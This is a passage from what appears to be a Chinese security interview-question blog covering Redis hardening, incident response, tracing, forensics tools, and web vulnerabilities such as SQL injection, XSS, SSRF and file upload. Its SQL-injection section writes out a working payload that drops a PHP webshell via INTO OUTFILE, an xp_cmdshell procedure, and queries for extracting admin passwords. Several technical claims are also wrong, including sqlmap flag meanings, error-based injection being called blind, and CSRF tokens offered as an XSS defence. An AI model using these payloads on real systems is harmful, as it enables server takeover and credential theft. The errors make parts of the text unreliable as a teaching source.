Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。</li><li>禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。</li><li>定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。</li></ol><p>总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。</p><h2 id="被攻击后，日志文件以及木马文件被删除怎样排查"><a href="#被攻击后，日志文件以及木马文件被删除怎样排查" class="headerlink" title="被攻击后，日志文件以及木马文件被删除怎样排查"></a>被攻击后，日志文件以及木马文件被删除怎样排查</h2><p>被攻击后，日志文件和木马文件被删除会给排查工作带来很大的困难，但还是有一些方法可以尝试：</p><ol><li>查看系统备份：如果您的系统进行了定期备份，那么可以尝试从备份中恢复丢失的日志文件和木马文件。如果备份没有受到攻击，那么这种方式可能会非常有效。</li><li>恢复已删除文件：一些数据恢复软件，例如Recuva、EaseUS Data Recovery等，可以恢复已删除的文件。您可以尝试使用这些软件来恢复被删除的文件。</li><li>检查其他主机：如果您的系统被集成到网络中，可以检查其他主机是否有相同的攻击迹象和后门程序。对于攻击者来说，攻击多台主机通常需要更多的时间和资源，因此在其他主机上发现类似的攻击行为也许能够提供有用的信息。</li><li>分析系统快照：如果您的系统支持系统快照功能，例如 Windows 系统还原点，可以尝试回滚系统至之前的快照状态，并分析该状态下的日志信息和系统状态，以寻找攻击行为的证据。</li><li>日志审计：如果日志文件被删除，可以尝试通过其他渠道收集日志信息，并进行审计分析。例如，可以检查网络流量、系统性能、系统进程等信息，以确定是否存在异常行为。</li></ol><p>总之，在日志文件和木马文件被删除的情况下，需要采用其他方法来寻找攻击迹象和证据。同时，为了避免这种情况的发生，我们应该在系统中设置必要的日志轮转和备份策略，并加强安全防御工作，避免被攻击者入侵。</p><h2 id="安全设备报警"><a href="#安全设备报警" class="headerlink" title="安全设备报警"></a>安全设备报警</h2><p>安全设备报警是指安全设备（例如入侵检测系统、防火墙、安全加固等）监测到的与安全相关的事件或活动达到了预先设定的规则和阈值，触发了警报通知。以下是一些处理安全设备报警的方法：</p><ol><li>确认警告的真实性：首先需要确认收到的警报信息是否为真实的安全事件，需要对日志和其他相关信息进行分析和验证。如果发现确实存在安全问题，则需要立即采取适当措施。</li><li>优先级分类：不同类型的安全事件具有不同的严重程度和威胁级别，需要根据事件的类型、来源等因素进行分类和优先级排序，并采取相应的措施进行处理。</li><li>制定处理计划：根据事件情况和优先级，制定相应的处理计划和操作流程。这些计划可以包括隔离受感染主机、采取补救措施、收集证据等方面。</li><li>跟踪事件进展：在处理安全事件时，需要跟踪事件的进展和结果，并及时更新相关记录和文档。同时要保持与相关人员的沟通和协调，以便及时解决问题。</li><li>定期复查：定期审查和分析系统和设备的报警记录和日志，以及采取的应对措施和效果。这可以帮助发现系统中存在的风险和漏洞，并及时加以修复和优化。</li></ol><p>总之，在处理安全设备报警时，需要快速响应、分类优先、制定计划等步骤，以保障系统的安全性，并且需要持续地监测和优化安全防御策略。</p><h2 id="日志与流量分析"><a href="#日志与流量分析" class="headerlink" title="日志与流量分析"></a>日志与流量分析</h2><p>日志和流量分析是网络安全领域中常用的两种技术。它们都可以帮助安全人员更好地了解系统的状态，检测和预防威胁。</p><p>日志分析是指对服务器、应用程序等产生的日志进行收集、存储、分析和处理，以便了解系统的运行状况和发现异常事件。通过对日志数据的统计和分析，可以追踪用户活动、系统错误、安全事件等，以及发现潜在的风险和漏洞。比如，通过分析登录日志可以检测到恶意登录尝试；通过分析访问日志可以了解网站的被攻击情况。</p><p>流量分析是指对网络流量进行收集、存储、分析和处理，以便了解网络连接的状态，检测和预防网络攻击。通过对流量数据的统计和分析，可以追踪网络通信、检测威胁和漏洞，比如检测恶意流量、DDoS攻击等。流量分析通常需要使用专业的工具和技术，包括网络协议分析、流量捕获和分析软件等。</p><p>综上所述，日志和流量分析是网络安全中非常重要的技术，它们可以帮助安全人员发现和解决潜在的安全问题，并维护系统和网络的正常运行。</p><h2 id="服务器资源异常"><a href="#服务器资源异常" class="headerlink" title="服务器资源异常"></a>服务器资源异常</h2><ol><li>检查服务器负载情况：使用系统监视工具（如top、htop或glances等）来检查服务器的负载状况。如果负载过高，请考虑升级服务器资源或调整应用程序配置。</li><li>清理硬盘空间：如果硬盘空间不足，可以删除不必要的文件和日志，或者将它们移到其他存储设备上。</li><li>优化数据库：如果您的应用程序使用了数据库，可以尝试优化数据库以提高性能和减少资源使用。</li><li>减少并发连接数：如果您的应用程序支持并发连接，可以考虑限制同时连接的数量，从而减轻服务器压力。</li><li>升级服务器硬件：如果您的服务器硬件过时，升级服务器硬件可能是一个好选择。</li></ol><p>这里列出的是一些常见的解决方法，但具体应该根据您的问题和实际情况进行分析和处理。</p><h2 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h2><p>邮件钓鱼是一种利用欺骗手段获取用户敏感信息（如用户名和密码）的网络攻击。以下是一些防范邮件钓鱼的措施：</p><ol><li>仔细检查发件人和链接：在打开或回复任何邮件之前，请确保发件人地址是正确的，并且不要点击任何可疑的链接。</li><li>不要泄露敏感信息：请不要在电子邮件中提供敏感信息，例如您的用户名、密码或银行卡号码等。</li><li>使用邮件过滤器：许多电子邮件服务提供商都有垃圾邮件和恶意软件过滤器，可以帮助防止钓鱼邮件进入您的收件箱。</li><li>使用双因素身份验证：如果可能的话，请使用双因素身份验证来增强账户安全性。</li><li>教育员工：对于企业来说，教育员工如何识别和应对钓鱼邮件至关重要，这将有助于减少安全风险。</li></ol><p>总之，防范邮件钓鱼需要我们保持警惕，小心处理邮件，避免泄露敏感信息，使用合适的安全工具，加强安全意识培训。</p><h2 id="蜜罐系统"><a href="#蜜罐系统" class="headerlink" title="蜜罐系统"></a>蜜罐系统</h2><p>蜜罐系统是一种安全防御技术，它通过模拟真实系统和应用程序环境来诱导攻击者进行攻击，以便收集攻击者的行为信息并保护真实系统免受攻击。</p><p>蜜罐系统通常包括以下组件：</p><ol><li>虚拟机：虚拟机用于运行蜜罐操作系统和应用程序，并提供与真实系统类似的环境。</li><li>模拟应用程序：模拟应用程序模拟真实应用程序的功能，但同时也被设计成易受攻击的。</li><li>监听器：监听器负责记录攻击者的所有行为，例如攻击方式、攻击目标、攻击时间等。</li><li>分析器：分析器负责对监听器收集到的数据进行分析，并生成相关的报告。</li></ol><p>使用蜜罐系统可以帮助安全团队更好地了解攻击者的行为和策略。此外，当攻击发生时，蜜罐系统还可以吸引攻击者并分散他们的注意力，从而降低真实系统遭受攻击的风险。</p><p>但需要注意的是，使用蜜罐系统也存在一些风险，如攻击者可能会利用蜜罐系统来了解防御策略和安全漏洞，因此在使用蜜罐系统时需要谨慎评估其风险和收益。</p><h2 id="溯源反制手段"><a href="#溯源反制手段" class="headerlink" title="溯源反制手段"></a>溯源反制手段</h2><p>溯源反制手段是指在网络攻击发生后，对攻击来源进行追踪和分析，以便采取相应的反制措施。以下是一些常见的溯源反制手段：</p><ol><li>IP地址追踪：通过IP地址追踪可以确定攻击者的地理位置和ISP信息等，并且可以将这些信息提供给执法机构进行调查和追诉。</li><li>系统日志分析：系统日志记录了系统的所有活动信息，包括用户登录、访问权限、进程启动等。通过对系统日志的分析，可以了解攻击的时间、方式和攻击者可能留下的痕迹。</li><li>恶意软件分析：恶意软件通常会留下特定的标志或指令，这些标志或指令可以帮助分析人员了解攻击者的目的和策略。通过分析恶意软件，还可以发现其它潜在的安全威胁。</li><li>威胁情报分析：威胁情报分析可以帮助判断攻击者的目的和策略，并可以收集针对特定攻击的信息和反制策略。</li><li>电子邮件头分析：邮件头中包含了一些关于发送方和接收方的信息，例如IP地址、电子邮件客户端类型等。通过分析邮件头，可以确定攻击者的来源和行踪。</li></ol><p>总之，在进行溯源反制时，需要综合运用多种手段，从多个角度收集信息，并对这些信息进行深入分析，以便更好地了解攻击的情况，采取相应的反制措施。</p><h2 id="通过wireshark工具如何对流量进行溯源？"><a href="#通过wireshark工具如何对流量进行溯源？" class="headerlink" title="通过wireshark工具如何对流量进行溯源？"></a>通过wireshark工具如何对流量进行溯源？</h2><p>Wireshark是一个网络抓包工具，可以捕获和分析网络流量。以下是使用Wireshark工具对流量进行溯源的步骤：</p><ol><li>打开Wireshark软件并开始捕获网络流量。</li><li>过滤出需要关注的数据包。例如，如果要寻找某个IP地址的流量，可以在Wireshark中使用过滤器“ip.addr == [目标IP地址]”来过滤出相关数据包。</li><li>找到涉及目标IP地址的数据包，并分析它们。可以查看数据包的详细信息，例如源IP地址、目标IP地址、端口号、协议类型等，以获取更多有关攻击者的信息。</li><li>根据数据包的来源IP地址和端口号，确定攻击者可能所在的网络或主机。可以通过WHOIS查询来了解更多信息，例如注册人姓名、电子邮件地址、电话号码等。</li><li>对数据包进行深入分析，以判断是否存在恶意活动。例如，检查数据包中传输的文件是否被感染，或者检查是否存在异常流量或频繁的连接尝试等。</li></ol><p>总之，通过Wireshark工具对流量进行溯源需要我们认真观察和分析数据包，尤其需要关注目标IP地址和涉及该地址的数据包，从多个角度收集信息，以便更好地了解攻击的情况，并采取相应的反制措施。</p><h2 id="如何定位到攻击-IP"><a href="#如何定位到攻击-IP" class="headerlink" title="如何定位到攻击 IP"></a>如何定位到攻击 IP</h2><p>为了定位到攻击IP，您可以跟随以下步骤：</p><ol><li>收集攻击事件的日志信息：首先，您需要获取与攻击相关的日志信息。这可能包括服务器、网关或IDS/IPS设备等的日志文件。检查这些日志文件以查看攻击事件的详细信息。</li><li>确定攻击类型：根据攻击日志信息，确定攻击类型，例如DDoS攻击、SQL注入等。</li><li>使用网络嗅探工具：您可以使用像Wireshark这样的网络嗅探工具来捕获和分析网络流量。通过分析数据包，您可以确定攻击流量的来源IP地址。</li><li>分析网络流量：对分析出的流量进行深入分析，查找异常流量特征。例如，您可以检查是否有大量流量来自同一IP地址或者是否有许多连接尝试来自相同的IP地址。</li><li>使用WHOIS查询：使用WHOIS查询可以帮助您查找IP地址归属地和注册人信息，以便更好地了解攻击者的位置和身份。</li><li>采取反制措施：最后，根据收集到的信息，确定攻击者的IP地址，并采取相应的反制措施，例如在防火墙中添加黑名单规则或使用安全设备来抵御攻击。</li></ol><p>需要注意的是，攻击者可能会使用虚假或伪造的IP地址来掩盖自己的身份和位置。在这种情况下，您可能需要使用其他技术手段来确定攻击者的真实来源。</p><h2 id="常用取证工具有哪些"><a href="#常用取证工具有哪些" class="headerlink" title="常用取证工具有哪些"></a>常用取证工具有哪些</h2><p>常用的取证工具包括：</p><ol><li>FTK（Forensic Toolkit）：一款全面的数字取证工具，可以获取、分析和报告各种数字数据。</li><li>EnCase：一款商业化的取证工具，广泛应用于执法机构和企业中。</li><li>X-Ways Forensics：一款功能强大的取证工具，可以解析多种文件系统和磁盘映像格式。</li><li>Autopsy：一个免费的开源取证工具，可以帮助用户快速识别证据并生成相应的报告。</li><li>Volatility Framework：一个基于内存取证的工具，可以提取运行中操作系统的进程、内核模块和网络连接等信息。</li><li>Wireshark：一款流量分析工具，可以捕获和分析网络数据包，并对其进行深入的分析。</li><li>Forensic Browser for SQLite：一款专门用于SQLite数据库的取证工具，可以查看、搜索和导出SQLite数据库中的数据。</li></ol><p>这些工具都有各自的优缺点和适用场景，根据实际需求选择合适的工具很重要。</p><h2 id="溯源的常见手法？"><a href="#溯源的常见手法？" class="headerlink" title="溯源的常见手法？"></a>溯源的常见手法？</h2><p>数字溯源是指通过分析数字证据，追踪和还原事件或活动的发生过程和轨迹。常见的溯源手法包括：</p><ol><li>网络日志溯源：根据网络日志记录来追踪网络活动的来源、目的地和传输路径。</li><li>数据库溯源：通过对数据库中数据修改、删除和查询等操作的记录，还原出相关事件的发生过程。</li><li>软件代码溯源：通过对软件代码进行逆向分析，确定软件的功能、用途和开发者信息。</li><li>文件元数据溯源：通过分析文件元数据（如文件创建时间、修改时间和所有者信息等），确定文件的来源和修改历史。</li><li>实体设备溯源：通过物理取证、数据提取和分析，还原数字设备被使用的历史记录和活动轨迹。</li></ol><p>综合运用这些溯源手法，可以有效地追踪和还原数字活动的整个过程，为刑事侦查、安全审计和企业风险管理等领域提供重要支持。但值得注意的是，数字溯源需要遵守严格的法律程序和规范，并尊重用户的隐私权和数据保护要求。</p><h2 id="如何封ip"><a href="#如何封ip" class="headerlink" title="如何封ip"></a>如何封ip</h2><p>封禁IP是指通过防火墙或其他网络安全设备，阻止某个IP地址对网络资源进行访问。封禁IP可以有效地防止恶意攻击、网络滥用和非法访问等问题，保护网络安全。</p><p>以下是封禁IP的一般步骤：</p><ol><li>登录防火墙或其他网络安全设备，进入配置界面。</li><li>找到IP过滤规则或黑名单功能，添加封禁规则。</li><li>在规则中填写要封禁的IP地址或IP地址段。</li><li>设置封禁的时间或持续期限（如永久封禁或暂时封禁）。</li><li>保存设置并生效，检查是否成功封禁目标IP。</li></ol><p>需要注意的是，在封禁IP之前，应该确认被封禁的IP确实存在安全问题，并遵守相应的法律和政策规定，以免误伤合法用户和引发纠纷。同时，应该及时监控封禁效果，并在必要的情况下进行调整和解除封禁。</p><h2 id="sql注入产生的原因是什么"><a href="#sql注入产生的原因是什么" class="headerlink" title="sql注入产生的原因是什么"></a>sql注入产生的原因是什么</h2><p>SQL注入是一种攻击技术，它利用应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向应用程序的后台数据库中插入恶意代码。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p><p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p><p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p><h2 id="sql注入怎么修复"><a href="#sql注入怎么修复" class="headerlink" title="sql注入怎么修复"></a>sql注入怎么修复</h2><p>修复SQL注入漏洞的主要方法之一是使用参数化查询。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。</p><p>另一个修复SQL注入漏洞的方法是对输入数据进行严格的验证和过滤。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。</p><p>最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。</p><p>总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。</p><h2 id="xss是什么"><a href="#xss是什么" class="headerlink" title="xss是什么"></a>xss是什么</h2><p>XSS（Cross-site scripting）是一种攻击技术，也是Web应用程序中最常见的漏洞之一。它利用了应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向网站上注入恶意脚本代码，使其他用户在浏览网站时受到攻击。</p><p>XSS攻击通常发生在包含表单、搜索框和评论框等用户输入区域的Web页面上。攻击者会向这些输入框中插入包含恶意脚本代码的数据，以便当其他用户在访问该页面时执行这些恶意代码，从而实现攻击目的。</p><p>例如，如果一个在线购物网站没有对用户在评论框中输入的HTML代码进行过滤，那么攻击者可以通过在评论框中注入恶意JavaScript代码来窃取其他用户的登录凭证或个人信息。</p><p>因此，要防止XSS攻击，开发人员需要对所有用户输入进行严格的验证和处理，并对任何输入的数据进行必要的过滤和转义，以确保所有输入的数据都不能被解释为恶意脚本。此外，还可以使用安全的编程实践和安全框架来保护网站免受XSS攻击的危害。</p><h2 id="xss攻击如何防御"><a href="#xss攻击如何防御" class="headerlink" title="xss攻击如何防御"></a>xss攻击如何防御</h2><p>为了防止XSS攻击，开发人员可以采用以下措施：</p><ol><li>输入过滤和验证：对于用户输入的数据进行严格的过滤和验证，只允许输入必要的字符和格式，并拒绝不受支持的HTML、CSS或JavaScript代码。</li><li>输出编码和转义：在将任何用户输入输出到Web页面上之前，请确保对其进行编码和转义，以确保它们不会被解释为恶意脚本。例如，在输出HTML时，可以使用HTML实体编码将特殊字符（如&lt;、&gt;、&amp;）转换为等效的字符实体。这样可以避免浏览器将它们解释为HTML标签或JavaScript代码。</li><li>使用安全框架和库：许多Web应用程序框架和安全库提供了内置的XSS防御机制，例如跨站点请求伪造（CSRF）令牌和自动输出编码。使用这些框架和库可以大大减少XSS攻击的风险。</li><li>学习安全编程实践：开发人员应该学习并遵循安全编程实践，例如安全的HTTP头设置、HTTPS使用、安全的Cookie管理等。</li><li>定期漏洞扫描和修复：定期运行漏洞扫描工具来检测网站中的潜在XSS漏洞，并及时修复这些漏洞，以避免遭受攻击。</li><li>加强用户教育：通过向用户提供安全意识培训和提示，可以帮助他们了解如何保护自己不受XSS攻击的危害，例如不点击垃圾邮件中的链接，不下载未经验证的文件等。</li></ol><h2 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a>ssrf是什么</h2><p>SSRF（Server-side Request Forgery，服务端请求伪造）是一种攻击技术，攻击者通过在受害者服务器上执行恶意代码，使该服务器对指定的目标URL发起网络请求。这种攻击通常利用了开发人员在编写Web应用程序时没有正确处理用户输入数据的漏洞，例如将用户提供的URL参数直接传递给后台服务器而没有做任何验证。</p><p>在SSRF攻击中，攻击者可以欺骗Web应用程序向其他服务器发送HTTP请求，例如内部服务器、本地网络资源或公共Web API等。攻击者还可以使用SSRF攻击来绕过防火墙保护，访问内部系统，并执行未授权的操作，例如读取机密数据、修改配置文件或上传恶意文件等。</p><p>为了避免SSRF攻击，开发人员需要采取以下措施：</p><ol><li>对所有输入进行严格的验证和过滤：开发人员在编写Web应用程序时应对所有输入数据进行严格的验证和过滤，以确保不会将任何恶意代码或非法请求发送到受害者服务器。</li><li>使用白名单：开发人员可以使用白名单技术限制应用程序仅向可信的服务器发送请求，例如内部服务器或特定的Web API。</li><li>限制服务器端请求发出范围： 在服务器上的Web应用程序必须限制服务器端请求的发出范围，例如通过禁止或限制特定的协议、域名或IP地址，以避免攻击者可以利用SSRF漏洞来发送恶意请求。</li><li>防火墙保护：使用防火墙的隔离技术可帮助防止恶意代码和非法请求进入Web应用程序，并限制其对其他系统的访问。</li></ol><h2 id="ssrf和csrf的区别"><a href="#ssrf和csrf的区别" class="headerlink" title="ssrf和csrf的区别"></a>ssrf和csrf的区别</h2><p>SSRF（Server-side Request Forgery，服务端请求伪造）和CSRF（Cross-site Request Forgery，跨站请求伪造）是两种不同的攻击类型，它们主要的区别在于攻击的目标和方式。</p><p>SSRF攻击是一种通过欺骗服务器来发送恶意请求的攻击技术，攻击者利用服务器上的漏洞进行攻击，并使服务器对指定的目标URL发起网络请求，从而达到恶意操作的目的。SSRF攻击主要针对服务器端应用程序。</p><p>而CSRF攻击则是一种利用用户身份验证信息来执行未经授权的操作的攻击，攻击者通过欺骗用户访问包含恶意代码的网站，来达到获取用户敏感信息、执行交易等攻击目的。CSRF攻击主要针对客户端浏览器。</p><p>另外，防御SSRF攻击和CSRF攻击的方法也有所不同。防御SSRF攻击需要对所有输入进行严格的验证和过滤，并使用白名单技术限制应用程序只向可信的服务器发送请求。而防御CSRF攻击需要使用随机的令牌（如CSRF Token）来验证每个请求的来源是否合法，并防止攻击者能够伪造请求或欺骗用户进行非法操作。</p><p>总之，虽然SSRF攻击和CSRF攻击是两种不同的攻击类型，但它们都需要开发人员采取必要的防御措施来确保Web应用程序和用户数据的安全。</p><h2 id="文件上传如何绕过"><a href="#文件上传如何绕过" class="headerlink" title="文件上传如何绕过"></a>文件上传如何绕过</h2><p>文件上传功能是许多Web应用程序中常见的功能之一，它可以让用户上传各种类型的文件。然而，如果没有正确的安全措施，攻击者可能会利用文件上传功能绕过应用程序的安全性控制并上传恶意文件。以下是一些攻击者可能使用的绕过方法：</p><ol><li>修改文件扩展名：攻击者可以将可执行文件的扩展名更改为其他文件格式的扩展名，例如将.exe文件更改为.jpg文件。这样，即使应用程序检查文件扩展名，也会认为该文件是合法的图像文件。</li><li>绕过文件类型检查：应用程序通常会限制上传文件的MIME类型或文件头，以确保只允许上传合法的文件。但是，攻击者可以通过修改文件头或添加特殊字符等方式来伪装文件类型和内容，从而绕过文件类型检查。</li><li>利用漏洞：应用程序可能存在漏洞，如目录遍历、任意文件上传等漏洞，攻击者可以利用这些漏洞来上传恶意文件，并在服务器上执行任意代码。</li></ol><p>为了防止文件上传漏洞被攻击者利用，开发人员可以采取以下措施：</p><ol><li>对所有上传文件进行严格的验证和过滤：开发人员应该对上传的文件类型、大小、MIME类型等进行严格的验证和过滤，确保只允许上传合法的文件。并且在服务器端进行对上传文件类型、大小、MIME类型等的再次检查。</li><li>为上传文件生成唯一的文件名：开发人员可以为每个上传文件生成唯一的文件名，以避免攻击者通过上传恶意文件来覆盖或修改其他文件。</li><li>使用安全的文件上传库：使用安全的文件上传库，例如PHP的move_uploaded_file函数可以确保文件上传的安全性。</li><li>对上传目录设置权限：只允许应用程序访问上传目录，并设置适当的目录权限，以防止攻击者上传和执行恶意文件。</li></ol><p>总之，开发人员需要对文件上传功能进行充分的安全测试，并采取必要的措施来防止攻击者利用漏洞绕过文件上传功能的安全限制。</p><h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>Java反序列化是一种Java对象序列化（将Java对象转换为字节流）的逆过程，即将字节流重新转换回Java对象。在Java中，可以使用ObjectInputStream类来实现反序列化。虽然Java反序列化本身是一种有用的技术，但它也可能导致安全风险。</p><p>Java反序列化漏洞是指恶意用户通过发送精心构造的序列化数据并触发其反序列化过程，从而执行未经授权的代码或操作。攻击者可以利用此漏洞来执行远程命令、绕过应用程序的安全检查、窃取敏感信息等攻击。</p><p>为了防止Java反序列化漏洞的攻击，开发人员可以采取以下措施：</p><ol><li>处理未信任的数据：开发人员应该避免反序列化未受信任的数据，例如来自不可靠来源的网络请求或从未知来源的文件读取的数据。</li><li>使用安全的序列化库：一些第三方序列化库，如Jackson和Gson等，提供了更加安全的序列化和反序列化功能。开发人员可以使用这些库来避免Java反序列化漏洞。</li><li>实现自定义反序列化方法：对于那些包含重要数据且需要进行反序列化的Java对象，可以实现自定义反序列化方法以控制反序列化过程。</li><li>消除未使用的反序列化代码：如果没有必要进行反序列化操作，开发人员可以将其删除或注释掉，以减少潜在的攻击面。</li><li>定期更新和维护应用程序：及时更新和修复应用程序中的漏洞和错误，并使用相关的安全工具来检测和防止Java反序列化漏洞。</li></ol><p>总之，要解决Java反序列化漏洞，开发人员需要对代码进行充分的安全测试，加强对数据的严格验证和过滤，并采取必要的措施来保护应用程序的安全性。</p><h2 id="sql注入如何写shell"><a href="#sql注入如何写shell" class="headerlink" title="sql注入如何写shell"></a>sql注入如何写shell</h2><p>在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术：</p><ol><li>利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 MySQL 中可以使用 INTO OUTFILE 来将结果输出到文件中。</li></ol><p>例如，以下语句可以在MySQL中编写shell：</p><pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=1 UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;",2 INTO OUTFILE "/var/www/html/shell.php";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>利用LOAD_FILE函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。</li></ol><p>例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本：</p><pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=-1' UNION SELECT LOAD_FILE('/path/to/malicious/script.sh'),'',''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器：</li></ol><pre class="line-numbers language-none"><code class="language-none">CREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))ASBEGINDECLARE @ret intEXEC @ret = master..xp_cmdshell @cmdENDGOEXEC sp_ExecCmd 'command'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。</p><h2 id="sqlmap中risk和levels区别"><a href="#sqlmap中risk和levels区别" class="headerlink" title="sqlmap中risk和levels区别"></a>sqlmap中risk和levels区别</h2><p>在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 参数表示扫描等级。这两个参数的区别如下：</p><ol><li>风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</li><li>扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</li></ol><p>总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。</p><h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p><p>您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p><ol><li>SUBSTRING() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>LENGTH() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT LENGTH((SELECT username from users WHERE id=1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。</p><h2 id="支持报错注入的数据库都有哪些"><a href="#支持报错注入的数据库都有哪些" class="headerlink" title="支持报错注入的数据库都有哪些"></a>支持报错注入的数据库都有哪些</h2><p>报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况：</p><ol><li>MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。</li><li>Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。</li><li>Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。</li><li>PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。</li><li>SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。</li></ol><p>总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。</p><h2 id="一个登录框怎么测试"><a href="#一个登录框怎么测试" class="headerlink" title="一个登录框怎么测试"></a>一个登录框怎么测试</h2><p>对于一个登录框，我们需要进行以下测试：</p><ol><li>验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。</li><li>测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。</li><li>测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。</li><li>测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。</li><li>测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 